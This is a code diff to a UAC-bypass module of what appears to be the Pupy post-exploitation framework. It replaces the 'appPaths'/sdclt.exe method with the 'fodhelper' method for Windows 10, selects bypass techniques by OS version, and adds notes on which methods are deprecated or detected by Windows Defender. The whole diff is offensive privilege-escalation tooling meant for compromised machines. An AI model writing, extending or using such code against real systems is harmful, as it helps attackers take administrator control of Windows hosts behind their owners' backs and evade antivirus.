@@ -17,7 +17,7 @@ class BypassUAC(PupyModule):
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
-        self.arg_parser.add_argument('-m', dest='method', choices=["appPaths","eventvwr", "dll_hijacking"], default=None, help="By default, the method will be choosen for you: 'eventvwr' for wind7-8.1 and 'appPaths' for wind10. dll_hijacking method can be used for Windows 7/2008 and Windows 8/2012")
+        self.arg_parser.add_argument('-m', dest='method', choices=["fodhelper","eventvwr", "dll_hijacking"], default=None, help="By default, the method will be choosen for you: 'eventvwr' for wind7-8.1 and 'fodhelper' for wind10. 'fodhelper' can be used on Wind10 only. 'dll_hijacking' method is deprecated (Windows 7/2008 and Windows 8/2012)")
 
     def run(self, args):
         # check if a UAC Bypass can be done
@@ -25,7 +25,7 @@ class BypassUAC(PupyModule):
             self.error('Your are not on the local administrator group.')
             return
 
-        appPathsMethod = False
+        fodhelperMethod = False
         eventvwrMethod = False
         dllhijackingMethod = False
 
@@ -33,23 +33,27 @@ class BypassUAC(PupyModule):
         # choose methods depending on the OS Version
         if not args.method:
             if self.client.desc['release'] == '10':
-                appPathsMethod = True
+                fodhelperMethod = True
             else:
                 dllhijackingMethod = True
-        elif args.method == "appPaths":
-            appPathsMethod = True
+        elif args.method == "fodhelper":
+            fodhelperMethod = True
         elif args.method == "eventvwr":
             eventvwrMethod = True
         elif args.method == "dll_hijacking":
             dllhijackingMethod = True
 
-        if appPathsMethod:
-            self.success("Trying to bypass UAC using the 'app paths'+'sdclt.exe' method, wind10 targets ONLY...")
-            bypassUasModule.bypassuac_through_appPaths()
+        if fodhelperMethod:
+            self.success("Trying to bypass UAC using the 'fodhelper' method, wind10 targets ONLY...")
+            bypassUasModule.bypassuac_through_fodhelper()
         if eventvwrMethod:
-            self.success("Trying to bypass UAC using the Eventvwr method, wind7-10 targets...")
+            #It is still working on Wind7 (tested 2017/09/14)
+            self.warning("DEPRECATED method for wind10. Tested 2017/09/14")
+            self.warning("Detected by Windows Defender on Wind10 (tested 2017/09/14)")
+            self.success("Trying to bypass UAC using the Eventvwr method, wind7-8.1 targets...")
             bypassUasModule.bypassuac_through_eventVwrBypass()
         if dllhijackingMethod:
-            # Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
+            #Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
+            self.warning("DEPRECATED method. i.e. It doesn't work anymore on Wind7 (tested 2017/09/14)")
             self.success("Trying to bypass UAC using DLL Hijacking, wind7-8.1 targets...")
             bypassUasModule.bypassuac_through_powerSploitBypassUAC()
